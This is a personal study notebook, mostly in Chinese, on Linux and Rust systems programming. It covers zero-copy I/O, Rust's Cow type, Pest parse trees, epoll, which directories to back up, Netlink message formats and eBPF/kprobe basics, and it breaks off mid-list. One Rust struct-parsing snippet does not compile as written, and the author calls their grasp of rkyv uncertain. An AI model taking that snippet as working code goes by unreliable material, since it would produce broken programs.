<p>除了<code>mmap</code>，<a href="https://man7.org/linux/man-pages/man2/sendfile.2.html"><code>sendfile</code></a>/<a href="https://man7.org/linux/man-pages/man2/splice.2.html"><code>splice</code></a>也可以实现类似的减少从kernel space到user space拷贝的作用，我们在后面介绍。他们提供的这种特性叫做<strong>零拷贝Zero Copy</strong>，<a href="https://zhuanlan.zhihu.com/p/308054212">知乎上的这篇文章</a>提供了一个很好的介绍。</p>
<blockquote>
<p>如果追求极致，你可以绕过内核做I/O操作，不过一般情况下这样做会牺牲相当的灵活性、可移植性，而且非常困难。</p>
</blockquote>
<h3 id="rust程序减少不必要的拷贝"><a class="header" href="#rust程序减少不必要的拷贝">Rust程序减少不必要的拷贝</a></h3>
<p>在Rust中这个问题貌似比较突出，也许是因为我学艺不精老是写出很多无效内存拷贝的代码。例如，我想从文件中解析出一个结构体</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct Example {
  quote: String,
  a: [u8; 12],
  b: u64,
  c: char,
}
<span class="boring">}
</span></code></pre></pre>
<p>假设我从文件中的读取内容存储在了变量<code>buffer</code>中，那么就需要从<code>buffer</code>做一次拷贝到结构体。稍微好一点的方式，是像下面这样，使用引用的方式规避掉了这次拷贝。由于类似<code>u64</code>这样的数据类型是要求对齐的，所以使用了复制。<code>Serde</code>好像就是用这样的方式做的。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct Example&lt;'a&gt; {
  quote: &amp;'a str,
  a: &amp;'a [u8; 12],
  b: u64,
  c: char,
}

let a = Example {
  quote: str::from_utf8(&amp;buffer[0..30]).unwrap(),
  a: &amp;buffer[30..42],
  b: u64::from_le_bytes(&amp;buffer[42..50]),
  c: char::from_u32(u32::from_le_bytes(&amp;buffer[50..54]))).unwrap(),
}
<span class="boring">}
</span></code></pre></pre>
<p>而<code>rkyv</code>的文档中，介绍了一个更好的做法，所谓的zero-copy(注意，这个零拷贝和上面介绍的Linux的零拷贝是两码事)。如果我们在序列化的时候直接把结构按照他相应的内存表示做序列化，那解析的时候不是就直接是结构的样子了吗？(没有懂，可能理解有误)。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>I don't know, I didn't listen.__QOFFQLENAAAAAAAAAAAABBBBBBBBCCCC
^-----------------------------  ^---^---^-----------^-------^---
 quote bytes                    pointer  a           b       c
                                and len
                                ^-------------------------------
                                 Example
<span class="boring">}
</span></code></pre></pre>
<p>不过，根据我的理解，在大多数情况下我们的文件解析能做到第二种就已经很好了。对于数字这些小的变量，复制就复制了。没有必要一定要是读入内容的引用；对于大块的字节流、字符串等，我们不用把他复制过来，而是保存对他的引用。这样就已经不错了。即使只实现了第一种，也是可以原谅的，不过如果真的是这样，那么建议换一个有GC的语言，他更适合你。</p>
<h3 id="copy-on-write"><a class="header" href="#copy-on-write">Copy On Write</a></h3>
<p>只有在需要修改的时候才作复制。如果并不总是需要修改，那么我们可以很大程度减少拷贝的开销。</p>
<p>Rust对此支持的很好，使用标准库的<a href="https://doc.rust-lang.org/std/borrow/enum.Cow.html"><code>Cow</code></a>，Cow是一个枚举，他要么是一个引用，要么是拥有所有权的数据。</p>
<pre><pre class="playground"><code class="language-rust">use std::borrow::Cow;

const SENSITIVE_WORD: &amp;str = &quot;bad&quot;;

fn remove_sensitive_word&lt;'a&gt;(words: &amp;'a str) -&gt; Cow&lt;'a, str&gt; {
    if words.contains(SENSITIVE_WORD) {
        Cow::Owned(words.replace(SENSITIVE_WORD, &quot;&quot;))
    } else {
        Cow::Borrowed(words)
    }
}

fn remove_sensitive_word_old(words: &amp;str) -&gt; String {
    if words.contains(SENSITIVE_WORD) {
        words.replace(SENSITIVE_WORD, &quot;&quot;)
    } else {
        words.to_owned()
    }
}

fn main() {
    let words = &quot;I'm a bad boy.&quot;;
    let new_words = remove_sensitive_word(words);
    println!(&quot;{}&quot;, new_words);

    let new_words = remove_sensitive_word_old(words);
    println!(&quot;{}&quot;, new_words);
}
</code></pre></pre>
<h3 id="example-pest"><a class="header" href="#example-pest">Example: Pest</a></h3>
<p>关于第二种，大部分写的比较好的解析库都会做到。看一个例子<a href="Advanced/Linux/LinuxProgram/">Pest</a>。Pest是一个可以用于编译器语法分析的库，他可以将源代码解析成分析树。解析的规则用PET文法规定，Pest会根据文法规范自动生成解析代码，不过这个并不是在这篇文章我们讨论的。</p>
<p>Pest解析的分析树的节点，用<code>Pair</code>表示。<code>Pair</code>的基本功能是，可以通过<code>as_span</code>获得对应的源代码的一段，<code>as_rule</code>获得节点的类型，通过<code>into_inner</code>获得一个所有子节点的迭代器。当然还有别的接口，我们只介绍这些。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[derive(Clone)]
pub struct Pair&lt;'i, R&gt; {
    queue: Rc&lt;Vec&lt;QueueableToken&lt;R&gt;&gt;&gt;,
    input: &amp;'i str,
    start: usize,
}
<span class="boring">}
</span></code></pre></pre>
<p>例如对一个源代码的分析，下面都是<code>as_span</code>的输出。第一个<code>Span</code>是整个文件，后面三个是这个文件内的三个函数。Span有三个字段<code>str</code>,<code>start</code>,<code>end</code>。<code>str</code>就是源代码的引用，其实就是<code>Pair</code>的<code>input</code>字段。<code>start</code>和<code>end</code>就是引用片段在源代码的偏移。</p>
<pre><code>Span { str: &quot;int add(int a,int b){\n    return a+b;\n    /*\n    \tadd\n    */\n}\n\nint sub(int a,int b){\n    /*\n    \tsub\n    */\n    return a-b;\n}\n\nint main(){\n    int x;\n    int y;\n    x = 10;\n    y = 53;\n    return add(x,y)+sub(x,y);\n}&quot;, 
	start: 0, end: 217 
}

Span { str: &quot;int add(int a,int b){\n    return a+b;\n    /*\n    \tadd\n    */\n}&quot;, 
	start: 0, end: 62 
}
Span { str: &quot;int sub(int a,int b){\n    /*\n    \tsub\n    */\n    return a-b;\n}&quot;, 
	start: 64, end: 126 
}
Span { str: &quot;int main(){\n    int x;\n    int y;\n    x = 10;\n    y = 53;\n    return add(x,y)+sub(x,y);\n}&quot;, 
	start: 128, end: 217 
}
</code></pre>
<p>不过<code>Pair</code>中其实并没有直接存储<code>Span</code>中的<code>start</code>和<code>end</code>。要理解<code>Pair</code>，首先理解<code>QueueableToken</code>。一个文法符号（注意，<code>QueueableToken</code>虽然名字叫做Token，但是我觉得Symbol更加贴切，因为他代表的不一定是Terminator，也可以是Non-Terminator，没学过编译原理忽略）需要用一对QueueableToken表示，分别是<code>QueueableToken::Start</code>和<code>QueueableToken::End</code>类型的。</p>
<ul>
<li><code>QueueableToken::Start</code>
<ul>
<li><code>end_token_index</code>: 存储对应的<code>QueueableToken::End</code>在queue中的偏移。</li>
<li><code>input_pos</code>: 存储在源代码中文法符号的起点。</li>
</ul>
</li>
<li><code>QueueableToken::End</code>
<ul>
<li><code>start_token_index</code>: 存储对应的<code>QueueableToken::Start</code>在queue中的偏移。</li>
<li><code>rule</code>: 存储文法符号的类型。</li>
<li><code>input_pos</code>: 存储在源代码中文法符号的终点。</li>
</ul>
</li>
</ul>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub enum QueueableToken&lt;R&gt; {
    Start {
        end_token_index: usize,
        input_pos: usize,
    },
    End {
        start_token_index: usize,
        rule: R,
        input_pos: usize,
    },
}
<span class="boring">}
</span></code></pre></pre>
<p><code>Pair::start</code>存储的是<code>Vec&lt;QueueableToken&gt;</code>的偏移。</p>
<ol>
<li>寻找Pair对应的文法符号的起点：<code>queue[start]</code>一定是<code>QueueableToken::Start</code>。<code>queue[start].input_pos</code>就是对应的文法符号的起点，<code>queue[start].end_token_index</code>就是终点的偏移。</li>
<li>寻找Pair对应的文法符号的终点：<code>queue[queue[start].end_token_index]</code>一定是<code>QueueableToken::End</code>，<code>queue[queue[start].end_token_index].input_pos</code>就是对应的文法符号的终点，<code>queue[queue[start].end_token_index].rule</code>就是匹配的规则。</li>
</ol>
<p><code>into_inner</code>的实现基于这样一个观察。比如，对于<code>A-&gt;BC</code>这样一条规则，那么BC的范围肯定是A范围的子集。我们在构造<code>Vec&lt;QueueableToken&gt;</code>的时候，就让A的start在最前面，A的end在最后面。这样BC的范围就是<code>queue[A.start+1..A.end]</code>。</p>
<h2 id="针对网络的零拷贝技术"><a class="header" href="#针对网络的零拷贝技术">针对网络的零拷贝技术</a></h2>
<p>下面我们要面对的场景，是我们从硬盘中读取数据到内存，进行处理，然后写到网卡中。这是一个很典型的网络应用的操作。</p>
<p>那么，最原始的使用<code>read/write</code>进行操作的话，我们将至少会有4次拷贝。中间两次是内存中的拷贝，虽然需要内核态到用户态的切换，但是相对I/O来说还是快的。但是我们还是要优化中间2次。</p>
<ul>
<li>硬盘拷贝到内存（内核态），DMA，慢</li>
<li>内核态拷贝到用户态，CPU，快</li>
<li>用户态拷贝到内核态，CPU，快</li>
<li>内存（内核态）拷贝到网卡，DMA，慢</li>
</ul>
<p>如果我们使用之前介绍的<code>mmap</code>，我们可以优化到3次。</p>
<p>使用<code>sendfile</code>，可以优化到2次，硬盘-&gt;内核态内存-&gt;网卡。但是你也发现了，没有经过用户态我们怎么处理数据，答案就是<strong>没法处理数据</strong>，所以他可能只适合用于静态服务器。那么既然都无法处理了，还拷到内存干啥？能不能直接从硬盘DMA到网卡呢？答案是可以，新的Linux已经让<code>sendfile</code>可以做到这一点了，也就是可以优化到1次了。<code>splice</code>也是类似的。</p>
<h2 id="连接池"><a class="header" href="#连接池">连接池</a></h2>
<p>这里在介绍一个优化网络应用的方式，就是连接池。他常用于数据库的连接、TCP连接。如果我们每次向数据库调用一个SQL，或者每次向Server通过TCP发送一个请求，都是采用创建连接-发送请求-关闭连接的方式，那么就把很多的资源浪费在了创建连接上。</p>
<p>那么，当上述行为很频繁的时候，我们就应该考虑创建一个连接池：预先创建一些连接，在需要请求的使用拿出一个连接，使用完后不释放而是放回连接池。思路就是这么简单。</p>
<h2 id="异步和io多路复用"><a class="header" href="#异步和io多路复用">异步和I/O多路复用</a></h2>
<blockquote>
<p>异步编程适合 I/O 密集型应用，如果是计算密集型场景应该考虑使用同步编程。</p>
</blockquote>
<p>优化I/O bound程序的另一个方式，是在等待I/O的时候，让出CPU(<code>yield</code>的语义)去做其他的事情。虽然这并不能提高IO本身的速度，但是可以让你的软件更加流畅，不会被I/O阻塞。这个是最基本的思路。事实上，所有的操作系统会在I/O阻塞的时候进行调度，将当前阻塞的进程加入等待队列。经典的进程状态转移图，在I/O wait的时候，进程进入wait状态，调度到其他进程。</p>
<p><img src="Advanced/Linux/LinuxProgram//Users/bytedance/Documents/note/Linux/images/qEcMX.png" alt="operating system - What is &quot;Interrupt&quot; for transition of a process from  running to ready? - Stack Overflow" /></p>
<p>Rust中有对异步有标准库的支持和许许多多的异步框架。但是我还没有写过一个真正意义上的异步程序，就不在这里班门弄斧了。</p>
<p>如果我们的服务器需要同时支持N个客户端（不妨假设每个连接对应一个socket），不让一个客户端的请求阻塞了其他客户端，有下面的解决方案</p>
<ol>
<li>为每个客户创建一个线程。显然，非常浪费，不能支持很多的客户端。</li>
<li>利用I/O多路复用技术，让一个线程可以同时支持多个socket。select()，poll()，epoll() 都是<strong>同步I/O多路复用</strong>的机制。可以<strong>监视多个描述符</strong>，一旦某个描述符就绪（一般是读就绪或者写就绪，就是这个文件描述符进行读写操作之前），能够通知程序进行相应的读写操作。</li>
</ol>
<p>可以给select传递文件描述符列表，他会阻塞，直到有一个文件描述符完成了I/O或者超时。他是O(n)的。</p>
<pre><code class="language-c">int select(int nfds, fd_set *restrict readfds,
           fd_set *restrict writefds, fd_set *restrict exceptfds,
           struct timeval *restrict timeout);
</code></pre>
<p>poll感觉和select类似。</p>
<pre><code class="language-c">int poll(struct pollfd *fds, nfds_t nfds, int timeout);
</code></pre>
<p>epoll是一系列系统调用。他是最高效的，O(1)。他内部有一个rbtree和就绪列表。</p>
<ul>
<li>使用 epoll_create 在内核中创建一个上下文；</li>
<li>使用 epoll_ctl 向/从上下文添加/移除文件描述符；</li>
<li>使用 epoll_wait 等待上下文中的事件。</li>
</ul>
<p>io-uring是Linux内核提供的异步IO支持，在2019才引入Linux内核。</p>
<blockquote>
<p>我本来以为tokio这些runtime是利用到系统的异步IO接口，但是epoll是同步的？我就不是很明白了。</p>
<p>所有东西最后都是同步的，这个无所谓。Runtime可以将被IO阻塞的Task都加入IO多路复用的监听，继续执行就绪了的Task。</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="linux目录结构"><a class="header" href="#linux目录结构">Linux目录结构</a></h1>
<p>在对Linux的目录进行扫描的时候，发现一些“文件“他并不是真正的“文件”。直接对他打开读写会出错。</p>
<h2 id="should"><a class="header" href="#should">Should</a></h2>
<p>Under most circumstances you want to backup these:</p>
<ul>
<li><code>/home/</code> for user data and configuration.</li>
<li><code>/etc/</code> for system wide configuration files.</li>
<li><code>/var/</code> contains a mix of directories you usually want to backup and those you don't want to backup. See below for a more detailed explanation.</li>
</ul>
<p>Some more directories to consider are:</p>
<ul>
<li><code>/usr/local/</code> hand-installed packages (i.e. not installed through apt) are installed here. If you have packages installed here, you may want to backup the whole directory, so you don't have to reinstall them. If the packages themselves aren't important to you, it should be enough to backup <code>/usr/local/etc/</code> and <code>/usr/local/src/</code>.</li>
<li><code>/opt/</code> if you didn't store anything here, you don't need to back it up. If you stored something here, you are in the best position to decide, if you want to back it up.</li>
<li><code>/srv/</code> much like <code>/opt/</code>, but is by convention more likely to contain data you actually want to backup.</li>
<li><code>/root/</code> stores configuration for the root user. If that is important to you, you should back it up.</li>
</ul>
<p><code>/var/</code> contains many files you want to backup under most circumstances, but also some you don't want to backup.</p>
<p>You probably want to backup these:</p>
<ul>
<li><code>/var/lib/</code> this directory contains variable state data for installed applications. Depending on the application you want to backup that state or you don't. If you want to be on the safe side, you can just back up everything. Otherwise you can look at each sub-directory and decide for yourself if the data contained is important enough to you to back it up.</li>
<li><code>/var/mail/</code> you normally want to backup local mails.</li>
<li><code>/var/www/</code> if your web root is located here and this is the only place where your web content is stored, you want to back it up.</li>
<li><code>/var/games/</code> you may want to backup these, if system wide game data is important enough for you (not many games use this storage though).</li>
<li><code>/var/backups/</code> usually contains files that are automatically generated from other data that you usually want on a backup, but that would take an unnecessary amount of space in the backup or is otherwise cumbersome to backup. For example dpkg dumps a list of installed packages here, so you can later know which packages to install after restoring the backup. You probably want to backup this.</li>
<li><code>/var/spool/cron/crontabs/</code> might contain many commands or a complex schedule, even with dependencies on other systems, that has taken considerable effort to put together.</li>
</ul>
<p>You probably don't want to backup these:</p>
<ul>
<li><code>/var/cache/</code> contrary to the name, some contents of this directory are important, so check each subdirectory individually, as a rule of thumb, everything you put here yourself is important. You also might want to backup <code>/var/cache/debconf/</code>.</li>
<li><code>/var/lock/</code> locks usually (always) don't need to be backed up.</li>
<li><code>/var/run/</code> contains data that is only important for your running system, i.e. when you shutdown you system, it will not be needed any more.</li>
<li><code>/var/spool/</code> (other than <code>/var/spool/cron/crontabs</code>, see above) normally important data shouldn't be stored here, but you might want to check.</li>
</ul>
<p>You have to decide yourself on these:</p>
<ul>
<li><code>/var/local/</code> you normally know if you stored something here and whether you want it on a backup or not.</li>
<li><code>/var/opt/</code> see <code>/var/local/</code> or better check if something important is stored here.</li>
<li><code>/var/log/</code> depends on whether your logs are important to you and if you have enough space to store them (they might take a lot of backup space over time).</li>
</ul>
<p>NFS-mounted directories should generally be <em>excluded</em> from your backup scheme.</p>
<hr />
<p><a href="https://www.redhat.com/sysadmin/backup-dirs">redhat-backup-dirs</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="netlink"><a class="header" href="#netlink">Netlink</a></h1>
<h2 id="kernel和user通信方式"><a class="header" href="#kernel和user通信方式">Kernel和User通信方式</a></h2>
<p>当用户程序想和内核模块进行通信时，有哪些办法呢？</p>
<div class="table-wrapper"><table><thead><tr><th>Type</th><th>Arch portable</th><th>Event-based signaling</th><th>Easily extensible</th><th>Large data transfers</th></tr></thead><tbody>
<tr><td>syscall</td><td>No</td><td>No</td><td>No</td><td>Yes</td></tr>
<tr><td>/dev</td><td>No</td><td>No</td><td>No</td><td>Yes</td></tr>
<tr><td>/proc</td><td>Yes</td><td>No</td><td>No</td><td>No</td></tr>
<tr><td>sysfs</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td></tr>
<tr><td>Sockets(除了Netlink)</td><td>No</td><td>No</td><td>No</td><td>Yes</td></tr>
<tr><td>Netlink:star:</td><td>Yes</td><td>Yse</td><td>Yes</td><td>Yes</td></tr>
</tbody></table>
</div>
<p>The easiest is to use the <code>proc</code> file interface to communicate, especially if the message and the <strong>result are less than one page in size</strong>. General Sequence would be as under:</p>
<ol>
<li>Implement <code>proc_open()</code>, <code>proc_read()</code>, <code>proc_write()</code>, <code>proc_close()</code>;</li>
<li>Open and close can implement locking so that only one instance of userspace program can actually access the module request engine.</li>
<li>the task request is sent via a write to the <code>proc</code> file,</li>
<li>The write function will return successfully if the module understands the command, before returning the program will initialize the request processing, the processing can actually take place when the <code>proc</code> file is read if it is trivial. If the processing is significantly complex then i suggest that you read up on bottom halves1 (you can simply start a working queue).</li>
<li>The read either triggers the &quot;processing you want the module to do&quot;. or waits for the BH to finish the processing in case you do it that way. You can use a <code>spinlock</code> or a <code>mutex</code> to control flow.</li>
<li>The kernel processing returns the result upon completion.</li>
</ol>
<ul>
<li></li>
</ul>
<h2 id="netlink-datagram"><a class="header" href="#netlink-datagram">Netlink Datagram</a></h2>
<p>Netlink socket是用以实现<strong>用户进程与内核进程</strong>通信的一种特殊的进程间通信(IPC) ，也是网络应用程序与内核通信的最常用的接口。Netlink 是一种在内核与用户应用间进行<strong>双向数据传输</strong>的非常好的方式。从Socket的角度来说，他是基于datagram的（UDP也是），不过，他的字节序就是主机的字节序。</p>
<h3 id="header"><a class="header" href="#header">Header</a></h3>
<p>我们说他是基于数据报的，所以数据报的格式是什么呢？</p>
<p>下面是头部，定义在<a href="https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/netlink.h#L44">/include/uapi/linux/netlink.h</a></p>
<pre><code class="language-c">struct nlmsghdr {
	__u32		nlmsg_len;	/* Length of message including header */
	__u16		nlmsg_type;	/* Message content */
	__u16		nlmsg_flags;	/* Additional flags */
	__u32		nlmsg_seq;	/* Sequence number */
	__u32		nlmsg_pid;	/* Sending process port ID */
};
</code></pre>
<ul>
<li>Message length: 数据报的长度，包括头部，单位是byte。</li>
<li>Message type: 分为data message和control message两大类，其中control message又分为
<ul>
<li>NLMSG_NOOP: no operation</li>
<li>NLMSG_ERROR: this message contains an error.</li>
<li>NLMSG_DONE</li>
<li>NLMSG_OVERRUN: 暂时没有被使用</li>
</ul>
</li>
<li>Message flags: 这个有挺多的，可以参见源代码，介绍重要的几个
<ul>
<li>NLM_F_REQUEST: if this ﬂag is set, this Netlink message contains a request. <strong>Messages that go from from user to kernel-space must set this ﬂag</strong>, otherwise the kernel subsystem must report an invalid argument (EINVAL) error to the user-space sender.</li>
<li>NLM_F_ACK: the user-space application requested a conﬁrmation message from kernel-space to make sure that a given request was successfully performed. If this ﬂag is not set, the kernel-space reports the error synchronously via sendmsg() as errno value.</li>
</ul>
</li>
<li>Sequence number: message sequence number. This is useful together with NLM_F_ACK if an user-space application wants to make sure that a request has been correctly issued.</li>
<li>Port-ID: this ﬁeld contains a numerical identiﬁer that is assigned by Netlink.
<ul>
<li>kernel发送的数据包，这个字段应该是0</li>
<li>user发送的数据包，这个字段应该是指定的Port ID</li>
</ul>
</li>
</ul>
<img src="Advanced/Linux/LinuxProgram/../images/image-20211118104948028.png" alt="image-20211118104948028" style="zoom: 67%;" />
<h3 id="payload"><a class="header" href="#payload">Payload</a></h3>
<p>有时我们会在Netlink Header之后再加上一些额外的Header来实现我们的功能，比如下面介绍的Generic Netlink。理论上，Payload可以是任何东西，双方规定好怎么解释就行了。</p>
<p>不过我们经常使用TLV(Type-Length-Value)格式。</p>
<p>下面是错误消息定义在<a href="https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/netlink.h#L110">/include/uapi/linux/netlink.h</a>，</p>
<pre><code class="language-c">struct nlmsgerr {
	int		error;
	struct nlmsghdr msg;
};
</code></pre>
<ul>
<li>Error type: standarized error value. 定义在error.h</li>
<li>Netlink message: Netlink message which contains the request that has triggered the error.</li>
</ul>
<h3 id="可靠传输"><a class="header" href="#可靠传输">可靠传输</a></h3>
<p>我们之前说他是基于数据报的，无连接的，所以并不是可靠传输。但是他的“信道”是几乎不会出错的，所以，他是否可靠呢？出错有以下两种情况：</p>
<ol>
<li>Memory exhaustion: there is no memory available to allocate the message.</li>
<li>Buﬀer overrun: there is no space in the receiver queue that is used to store messages. This may occur in communications from kernel to user-space.</li>
</ol>
<p>所以，我们可以认为User-&gt;Kernel是可靠传输，Kernel-&gt;User不是。你可以利用ack和dump等机制构建自己的可靠传输协议。</p>
<h2 id="tlv"><a class="header" href="#tlv">TLV</a></h2>
<p>Payload是什么呢？理论上你可以自定义。不过一般我们就用TLV格式。</p>
<p><img src="Advanced/Linux/LinuxProgram/../images/image-20211231170201109.png" alt="image-20211231170201109" /></p>
<ul>
<li>Type: the attribute type according to the set of available types in the kernel subsystem.</li>
<li>Length: size in bytes of the attribute. This includes this header header plus the payload size of this attribute <strong>without alignment to 32 bits.</strong></li>
<li>Value: this field is variable in size but it is <strong>always aligned to 32 bits.</strong></li>
</ul>
<h2 id="generic-netlink"><a class="header" href="#generic-netlink">Generic Netlink</a></h2>
<p>自定义netlink协议，不推荐直接占用32个netlink协议号中的未使用号码，而推荐使用generic netlink。我们来看消息头。</p>
<img src="Advanced/Linux/LinuxProgram/../images/image-20211119100220631.png" alt="image-20211119100220631" style="zoom:67%;" />
<ul>
<li>前面的就是Netlink消息头。</li>
<li>command field (8 bits), that is a specific message type of the GeNetlink service.</li>
<li>version field (8 bits): that contains a revision value to allow changing the format without breaking backward compatibility.</li>
<li>reserved field (16 bits) which is introduced for padding reasons which is currently unused.</li>
</ul>
<p>所以，一般来说，我们抓获一个Generic Netlink包的结构是这样的。</p>
<img src="Advanced/Linux/LinuxProgram/../images/netlink.png" alt="image-20211119100220631" style="zoom:67%;" />
<h2 id="抓包"><a class="header" href="#抓包">抓包</a></h2>
<p>执行下面的命令。这个 nlmon 驱动模块会注册一个 netlink tap 口，用户态向内核发送 netlink 消息、内核向用户态发送 netlink 消息，报文都会经过这个 tap 口。包输出到netlink.pcap，可以用wireshark打开。</p>
<pre><code class="language-sh">$ sudo modprobe nlmon
$ ip link add nlmon0 type nlmon
$ ip link set dev nlmon0 up
$ tcpdump -i nlmon0 -w netlinik.pcap
</code></pre>
<hr />
<p>参考链接</p>
<ul>
<li><a href="https://elixir.bootlin.com/linux/latest/source/include/net/netlink.h#L550">Source code include/net/netlink.h</a></li>
<li><a href="https://elixir.bootlin.com/linux/latest/source/include/linux/netlink.h#L46">Source code include/linux/netlink.h</a></li>
<li><a href="https://perso.ens-lyon.fr/laurent.lefevre/pdf/JS2010_Neira_Gasca_Lefevre.pdf">一篇论文</a>，调理清晰，但是里面介绍TLV的格式顺序错了。</li>
<li>参考<a href="https://github.com/phip1611/generic-netlink-user-kernel-rust/blob/main/kernel-mod/gnl_foobar_xmpl.c">工程</a>，他的注释真是太友善了。</li>
<li><a href="https://blog.csdn.net/Longyu_wlz/article/details/108879156">抓包</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="socket"><a class="header" href="#socket">Socket</a></h1>
<h2 id="socket-in-kernel"><a class="header" href="#socket-in-kernel">socket in kernel</a></h2>
<pre><code class="language-c">// [include/linux/net.h]

struct socket {
    struct file     *file;
    struct sock     *sk;
    const struct proto_ops  *ops;
  // ...
};
</code></pre>
<p>虽然说Socket也是支持文件的操作，不过他还支持不是文件的操作。Socket 实现了<strong>BSD socket API</strong>(connect(), bind(), accept(), listen(), ...)，如下 </p>
<pre><code class="language-c">// [include/linux/net.h]

struct proto_ops {
    int     (*bind)    (struct socket *sock, struct sockaddr *myaddr, int sockaddr_len);
    int     (*connect) (struct socket *sock, struct sockaddr *vaddr,  int sockaddr_len, int flags);
    int     (*accept)  (struct socket *sock, struct socket *newsock, int flags);
  // ...
}
</code></pre>
<p>Those &quot;network packets&quot; are the so-called <strong>struct sk_buff</strong> (or skb). The receive/send buffers are basically a doubly-linked list of skb:</p>
<p><img src="Advanced/Linux/LinuxProgram/../images/core_struct_relationship.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ebpf-1"><a class="header" href="#ebpf-1">eBPF</a></h1>
<p>感觉网上的资料有一点零散。</p>
<h2 id="一些基础知识"><a class="header" href="#一些基础知识">一些基础知识</a></h2>
<h3 id="what-is-ebpf"><a class="header" href="#what-is-ebpf">What is eBPF</a></h3>
<blockquote>
<p>eBPF is a <strong>register-based Virtual Machine</strong> using a custom 64 bit RISC instruction set capable of <strong>running Just-in-Time native-compiled &quot;BPF programs&quot;</strong> inside the Linux kernel <strong>with access to a subset of kernel functions and memory</strong>. </p>
</blockquote>
<p>eBPF: 可以认为eBPF是虚拟机的字节码。首先虚拟机运行在Kernel中，让我们可以操作Kernel；其次我们不会直接用字节码编程，而是用其他的语言编译成字节码。他可以在操作系统内核等特权上下文中运行沙盒程序。它用于安全有效地扩展内核的功能，而无需更改内核源代码或加载内核模块。</p>
<h3 id="ebpf-bytecode"><a class="header" href="#ebpf-bytecode">eBPF Bytecode</a></h3>
<p>这个<a href="https://github.com/iovisor/bpf-docs/blob/master/eBPF.md">非官方的Spec</a>介绍了字节码的结构，比较清楚。还有<a href="https://www.kernel.org/doc/Documentation/networking/filter.txt">官方Spec</a></p>
<p>每个指令是64位的。有ALU指令，内存load/store指令，跳转指令。</p>
<pre><code>msb                                                        lsb
+------------------------+----------------+----+----+--------+
|immediate               |offset          |src |dst |opcode  |
+------------------------+----------------+----+----+--------+
   32bits                   16bits           4   4      8
</code></pre>
<p>每个寄存器也是64位的。</p>
<div class="table-wrapper"><table><thead><tr><th><strong><code>r0:</code></strong></th><th>stores return values, both for function calls and the current program exit code</th></tr></thead><tbody>
<tr><td><strong><code>r1-r5:</code></strong></td><td>used as function call arguments, upon program start r1 contains the &quot;context&quot; argument pointer</td></tr>
<tr><td><strong><code>r6-r9:</code></strong></td><td>these get preserved between kernel function calls</td></tr>
<tr><td><strong><code>r10:</code></strong></td><td>read-only pointer to the per-eBPF program 512 byte stack</td></tr>
</tbody></table>
</div>
<p>不过，内核不允许加载超过4096条指令，也不允许死循环的出现。还会做类型检查，禁止NULL dereference。</p>
<h3 id="hook-1"><a class="header" href="#hook-1">hook</a></h3>
<p>A hook point is a place in the kernel to which a bpf program can be attached. </p>
<p>eBPF 对内核预定义了一组 hook 点，涉及到内核调用、内核函数的出入点、内核跟踪点（tracepoints）、网络事件等等。如果这些位置都不满足需要，那么可以在运行时生成内核探针(kprobe)、应用探针(uprobe)。所以理论上，你可以hook任何一个地点。</p>
<blockquote>
<p>kprobe是什么？简单的理解</p>
<ol>
<li>他让你可以在内核的<a href="https://docs.kernel.org/trace/kprobes.html#kprobes-blacklist"><strong>几乎</strong></a>任意一个地方，打一个断点（更细节的说，把一个指令的第一个字节备份然后修改成<code>int 3</code>，更准确的说，在x86上是<code>int 3</code>，在其他架构上断点的标识不同）。</li>
<li>所以当内核运行到断点的时候会产生一个异常，控制流就这样被劫持了。系统把所有的寄存器保存好，调用你之前准备的hook函数<code>pre_handler</code>。</li>
<li>然后，内核单步执行这条指令（其实是单步执行这条指令的副本，为了防止另一个CPU在这个短暂的时间片越过断点），执行完成之后，系统把所有的寄存器保存好，再调用你之前准备的hook函数<code>post_handler</code>。一个细节的问题，这条指令如果产生了其他的异常怎么办？</li>
</ol>
<p>所以他可以在指令前后进行hook。kprobe模块可以在Kernel的<a href="https://elixir.bootlin.com/linux/v5.15.39/source/samples/kprobes">/sample/kproble</a>下找到例子。为了方便，内核还提供了kretprobe，他可以帮你在函数的入口处和函数的返回处添加hook。</p>
<p>寄存器保存在<code>pt_regs</code>中，你可以<strong>修改</strong>他，也就是说你有能力修改原先的执行逻辑，可以改变函数的返回值！</p>
</blockquote>
<p>不过，eBPF的hook点，并不局限于kprobe。可以看下面的这张图，有一些固定的Tracepoints，还有可以动态的加载kprobes/uprobes。</p>
<p><img src="Advanced/Linux/LinuxProgram/../images/image-20220515005100396.png" alt="image-20220515005100396" /></p>
<h2 id="如何编写ebpf程序"><a class="header" href="#如何编写ebpf程序">如何编写eBPF程序</a></h2>
<p><img src="Advanced/Linux/LinuxProgram/../images/image-20220515004855567.png" alt="image-20220515004855567" /></p>
<p>所以，是不是编写的基本思路，就是</p>
<ol>
<li>注册一个新的hook point/利用已经有的hook point。</li>
<li>向内核注册一个eBPF程序，把他和hook point关联在一起。</li>
<li>eBPF可以获取hook point的一些上下文信息，通过一些以及eBPF函数的参数，和<strong>helper function</strong>。</li>
<li>eBPF可以和用户态程序通信，这个通信是<strong>双向</strong>的。
<ol>
<li>在内核我们通过一些<strong>helper function</strong>操作maps，在用户态我们通过<strong>文件</strong>的方式访问maps。</li>
</ol>
</li>
</ol>
<p>helper function，下面是简单的总结，详细的可以参考<a href="https://man7.org/linux/man-pages/man7/bpf-helpers.7.html">man page</a>和<a href="https://github.com/iovisor/bcc/blob/master/docs/reference_guide.md#bpf-c">其他人的总结</a>。</p>
<ol>
<li><code>bpf_probe_read_XXX</code>: 从Kernel/User的Buffer中读取内容，换句话说就是可以读取特定内存中的数据。</li>
